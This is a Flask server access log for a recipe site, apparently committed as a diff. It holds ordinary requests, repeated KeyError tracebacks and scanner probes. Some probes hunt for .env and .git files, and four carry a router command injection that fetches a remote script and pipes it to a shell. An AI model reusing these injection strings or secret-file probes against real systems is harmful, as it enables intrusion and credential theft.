+172.236.1.60 - - [08/Oct/2024 11:33:42] "[36mGET /static/assets/desserts.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 11:33:42] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 11:33:42] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 11:33:42] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 11:35:06] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 11:36:09] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 11:50:46] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 11:52:00] "[33mGET /actuator/health HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 11:54:31] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 12:23:27] "[33mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 12:32:12] "GET / HTTP/1.1" 200 -
+207.90.244.5 - - [08/Oct/2024 12:41:30] "GET / HTTP/1.1" 200 -
+207.90.244.5 - - [08/Oct/2024 12:41:30] "GET /static/assets/cookbook.png HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 12:53:27] "[33mGET /.git/config HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 14:12:44] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 14:16:08] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 14:16:25] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.17.31/t|sh;`) HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 14:16:45] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.17.31/t|sh;`) HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 14:17:40] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 14:28:27] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 14:28:27] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 15:00:28] "GET / HTTP/1.1" 200 -
+71.6.134.230 - - [08/Oct/2024 15:21:30] code 400, message Bad request version ('À\x14À')
+71.6.134.230 - - [08/Oct/2024 15:21:30] "[31m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03èÕtè,ðöÄ\x12|¸Á\x1bÉ\x8aÁ¢Ë\x14:¶§mzy\x05s\x03¢º%³ \x02\x03a]!|æ\x1dÌ)Ì#Ù®\x85\x07q\x0e\x1f\x1dÜu{\x93ÁX\x9b>\x96s\x91'\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À[0m" 400 -
+172.236.1.60 - - [08/Oct/2024 15:22:06] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 15:23:19] "GET / HTTP/1.1" 200 -
+45.84.89.3 - - [08/Oct/2024 15:27:31] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+45.84.89.3 - - [08/Oct/2024 15:27:31] "[31m[1m\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\x00\x00\x06À0\x00\x9c\x00\x9d\x01\x00\x00R\x00\x0b\x00\x04\x03\x00\x01\x02\x00[0m" 400 -
+71.6.134.230 - - [08/Oct/2024 15:37:03] "GET / HTTP/1.1" 200 -
+71.6.134.230 - - [08/Oct/2024 15:37:32] "GET /static/assets/cookbook.png HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 15:42:00] "[33mGET /+CSCOE+/logon.html HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 15:46:32] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 15:52:49] "[31m[1mCONNECT / HTTP/1.1[0m" 405 -
+172.236.1.60 - - [08/Oct/2024 16:03:06] "[33mGET /auth/login.html HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 16:09:51] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+91.163.59.152 - - [08/Oct/2024 16:30:48] "[33mGET /timestamp HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 16:32:40] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 16:45:57] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 16:48:39] "[33mGET /ReportServer HTTP/1.1[0m" 404 -
+[2024-10-08 17:00:20,218] ERROR in app: Exception on /my_recipes [GET]
+Traceback (most recent call last):
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/server/routes.py", line 58, in my_recipes_page
+    starters = Recipes.query.filter_by(course = "starter", user_id = session['user_id']).all()
+                                                                     ~~~~~~~^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/sessions.py", line 84, in __getitem__
+    return super().__getitem__(key)
+           ^^^^^^^^^^^^^^^^^^^^^^^^
+KeyError: 'user_id'
+172.236.1.60 - - [08/Oct/2024 17:00:20] "[35m[1mGET /my_recipes HTTP/1.1[0m" 500 -
+172.236.1.60 - - [08/Oct/2024 17:00:20] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+[2024-10-08 17:01:48,472] ERROR in app: Exception on /my_recipes [GET]
+Traceback (most recent call last):
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/server/routes.py", line 58, in my_recipes_page
+    starters = Recipes.query.filter_by(course = "starter", user_id = session['user_id']).all()
+                                                                     ~~~~~~~^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/sessions.py", line 84, in __getitem__
+    return super().__getitem__(key)
+           ^^^^^^^^^^^^^^^^^^^^^^^^
+KeyError: 'user_id'
+172.236.1.60 - - [08/Oct/2024 17:01:48] "[35m[1mGET /my_recipes HTTP/1.1[0m" 500 -
+172.236.1.60 - - [08/Oct/2024 17:01:53] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:01:53] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:01:53] "[36mGET /static/assets/starters.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 17:01:53] "[36mGET /static/assets/mains.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 17:01:53] "[36mGET /static/assets/desserts.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 17:01:53] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:01:53] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:01:55] "POST /all_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:01:58] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:01:58] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:01:58] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:01:59] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:01:59] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:01:59] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:01:59] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:02:03] "POST /edit_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:02:04] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 17:02:06] "POST /update_recipe HTTP/1.1" 200 -
+[2024-10-08 17:02:07,882] ERROR in app: Exception on /my_recipes [GET]
+Traceback (most recent call last):
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/server/routes.py", line 58, in my_recipes_page
+    starters = Recipes.query.filter_by(course = "starter", user_id = session['user_id']).all()
+                                                                     ~~~~~~~^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/sessions.py", line 84, in __getitem__
+    return super().__getitem__(key)
+           ^^^^^^^^^^^^^^^^^^^^^^^^
+KeyError: 'user_id'
+172.236.1.60 - - [08/Oct/2024 17:02:07] "[35m[1mGET /my_recipes HTTP/1.1[0m" 500 -
+[2024-10-08 17:02:11,108] ERROR in app: Exception on /my_recipes [GET]
+Traceback (most recent call last):
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/server/routes.py", line 58, in my_recipes_page
+    starters = Recipes.query.filter_by(course = "starter", user_id = session['user_id']).all()
+                                                                     ~~~~~~~^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/sessions.py", line 84, in __getitem__
+    return super().__getitem__(key)
+           ^^^^^^^^^^^^^^^^^^^^^^^^
+KeyError: 'user_id'
+172.236.1.60 - - [08/Oct/2024 17:02:11] "[35m[1mGET /my_recipes HTTP/1.1[0m" 500 -
+[2024-10-08 17:02:14,114] ERROR in app: Exception on /my_recipes [GET]
+Traceback (most recent call last):
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/server/routes.py", line 58, in my_recipes_page
+    starters = Recipes.query.filter_by(course = "starter", user_id = session['user_id']).all()
+                                                                     ~~~~~~~^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/sessions.py", line 84, in __getitem__
+    return super().__getitem__(key)
+           ^^^^^^^^^^^^^^^^^^^^^^^^
+KeyError: 'user_id'
+172.236.1.60 - - [08/Oct/2024 17:02:14] "[35m[1mGET /my_recipes HTTP/1.1[0m" 500 -
+172.236.1.60 - - [08/Oct/2024 17:02:16] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:02:18] "GET /sign_in HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:02:18] "GET /sign_in HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:02:26] "[32mPOST /login HTTP/1.1[0m" 302 -
+172.236.1.60 - - [08/Oct/2024 17:02:26] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:02:26] "[36mGET /static/assets/head_pic.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 17:02:26] "[36mGET /static/assets/profile.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 17:02:26] "[36mGET /static/assets/chef.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 17:02:26] "[36mGET /static/assets/recipes.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 17:02:28] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:02:28] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:02:29] "POST /edit_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:02:31] "POST /update_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:02:32] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:02:36] "POST /edit_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:02:37] "POST /update_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:02:38] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:17:47] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:22:18] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:24:02] "[33mGET /cgi-bin/luci/;stok=/locale HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 17:52:37] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 17:57:29] "[33mGET /actuator/gateway/routes HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:03:08] "[33mGET /portal/redlion HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:03:32] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 19:03:36] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 19:03:36] "GET /static/assets/cookbook.png HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 19:03:37] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:13:09] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 19:14:28] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 19:29:30] "[33mGET /index.asp HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:29:44] "[33mGET /.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:29:45] "GET /?<play>withme</> HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 19:29:45] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+172.236.1.60 - - [08/Oct/2024 19:29:45] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+172.236.1.60 - - [08/Oct/2024 19:31:36] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.17.31/t|sh;`) HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:31:54] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.17.31/t|sh;`) HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:35:51] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 19:40:18] "GET / HTTP/1.1" 200 -
+[2024-10-08 19:46:36,294] ERROR in app: Exception on /my_recipes [GET]
+Traceback (most recent call last):
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 1473, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 882, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 880, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/app.py", line 865, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/var/www/3rd_milestone/server/routes.py", line 58, in my_recipes_page
+    starters = Recipes.query.filter_by(course = "starter", user_id = session['user_id']).all()
+                                                                     ~~~~~~~^^^^^^^^^^^
+  File "/var/www/3rd_milestone/.venv/lib/python3.11/site-packages/flask/sessions.py", line 84, in __getitem__
+    return super().__getitem__(key)
+           ^^^^^^^^^^^^^^^^^^^^^^^^
+KeyError: 'user_id'
+172.236.1.60 - - [08/Oct/2024 19:46:36] "[35m[1mGET /my_recipes HTTP/1.1[0m" 500 -
+172.236.1.60 - - [08/Oct/2024 19:46:43] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 19:52:37] "[33mGET /.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:39] "GET /?url=.env HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 19:52:40] "[33mGET /API/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:42] "[33mGET /_static/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:42] "[33mGET /blogs/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:43] "[33mGET /client/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:44] "[33mGET /data/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:45] "[33mGET /developer/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:46] "[33mGET /download/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:48] "[33mGET /html/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:49] "[33mGET /images/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:49] "[33mGET /lab/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:51] "[33mGET /localhost/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:52] "[33mGET /media/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:52] "[33mGET /psnlink/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:53] "[33mGET /public_html/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:54] "[33mGET /saas/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:54] "[33mGET /stag/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:55] "[33mGET /system/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:56] "[33mGET /templates/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:57] "[33mGET /.docker/laravel/app/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:58] "[33mGET /.gitlab-ci/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:52:59] "[33mGET /.vscode/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:00] "[33mGET /backup/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:01] "[33mGET /content/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:02] "[33mGET /cp/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:03] "[33mGET /doc/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:05] "[33mGET /docker/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:06] "[33mGET /exapi/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:07] "[33mGET /img/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:08] "[33mGET /inc/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:10] "[33mGET /includes/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:10] "[33mGET /js/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:11] "[33mGET /layout/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:12] "[33mGET /locally/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:13] "[33mGET /log/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:15] "[33mGET /misc/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:16] "[33mGET /platform/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:17] "[33mGET /secrets.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:18] "[33mGET /settings/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:19] "[33mGET /static/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:20] "[33mGET /staticfiles/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:22] "[33mGET /theme/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:23] "[33mGET /tmp/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:24] "[33mGET /upload/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 19:53:25] "[33mGET /v2/.env HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:28:13] "[33mGET /js/NewWindow_2_all.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:28:13] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:28:33] "[33mGET /api/session/properties HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:28:36] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:28:49] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:28:49] "[33mGET /favicon-32x32.png HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:28:49] "[33mGET /solr/ HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:28:50] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:28:51] "[33mGET /dist/ionicons/ionicons.esm.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:28:51] "[33mGET /dist/ionicons/ionicons.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:28:51] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:28:54] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:28:55] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:28:55] "[33mGET /dist/ionicons/ionicons.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:28:55] "[33mGET /dist/ionicons/ionicons.esm.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:28:59] "[33mGET /dist/ionicons/ionicons.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:28:59] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:28:59] "[33mGET /dist/ionicons/ionicons.esm.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:28:59] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:29:03] "[33mGET /dist/ionicons/ionicons.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:29:03] "[33mGET /dist/ionicons/ionicons.esm.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:29:03] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:29:03] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:29:05] "[33mGET /WebInterface/ HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:29:07] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:29:07] "[33mGET /dist/ionicons/ionicons.esm.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:29:07] "[33mGET /dist/ionicons/ionicons.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:29:07] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:29:11] "[33mGET /dist/ionicons/ionicons.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:29:11] "[33mGET /dist/ionicons/ionicons.esm.js HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 20:29:11] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:29:12] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 20:29:21] "GET / HTTP/1.1" 200 -
